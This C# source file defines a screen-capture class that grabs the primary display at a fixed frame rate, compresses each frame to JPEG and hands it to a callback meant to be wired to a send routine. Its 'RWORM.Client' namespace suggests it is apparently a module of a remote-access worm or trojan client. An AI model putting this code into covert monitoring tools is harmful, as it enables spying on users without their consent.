using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    /// <summary>
    /// Captures the primary screen, JPEG-compresses, and streams frames via OnFrame callback.
    /// Pure Win32 screen bounds without Windows Forms dependencies.
    /// </summary>
    public class RemoteDesktop : IDisposable
    {
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int nIndex);
        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;

        private CancellationTokenSource? _cts;
        private bool _running;

        /// Called with each JPEG frame (raw bytes). Wire this to SendAsync(0x81).
        public Func<byte[], Task>? OnFrame { get; set; }

        /// Frames per second (default 5 — low bandwidth)
        public int Fps { get; set; } = 5;

        /// JPEG quality 1-100 (default 40 for speed)
        public int Quality { get; set; } = 40;

        public bool IsRunning => _running;

        public void Start()
        {
            if (_running) return;
            _running = true;
            _cts     = new CancellationTokenSource();
            _ = Task.Run(CaptureLoop, _cts.Token);
        }

        public void Stop()
        {
            _running = false;
            _cts?.Cancel();
        }

        private async Task CaptureLoop()
        {
            int interval = 1000 / Math.Max(1, Fps);
            var enc      = GetJpegEncoder();

            while (_running && !(_cts?.IsCancellationRequested ?? true))
            {
                try
                {
                    int w = GetSystemMetrics(SM_CXSCREEN);
                    int h = GetSystemMetrics(SM_CYSCREEN);
                    if (w <= 0) w = 1920;
                    if (h <= 0) h = 1080;
                    var bounds = new Rectangle(0, 0, w, h);

                    using var bmp = new Bitmap(bounds.Width, bounds.Height,
                                               PixelFormat.Format32bppArgb);
                    using (var g = Graphics.FromImage(bmp))
                        g.CopyFromScreen(bounds.Location, Point.Empty,
                                         bounds.Size, CopyPixelOperation.SourceCopy);

                    byte[] frame;
                    using (var ms = new MemoryStream())
                    using (var encParms = new EncoderParameters(1))
                    {
                        encParms.Param[0] = new EncoderParameter(Encoder.Quality, (long)Quality);
                        bmp.Save(ms, enc, encParms);
                        frame = ms.ToArray();
                    }

                    if (OnFrame != null)
                        await OnFrame(frame);
                }
                catch { }

                await Task.Delay(interval);
            }
        }

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var c in ImageCodecInfo.GetImageEncoders())
                if (c.FormatID == ImageFormat.Jpeg.Guid) return c;
            throw new NotSupportedException("JPEG encoder not found");
        }

        public void Dispose() => Stop();
    }
}
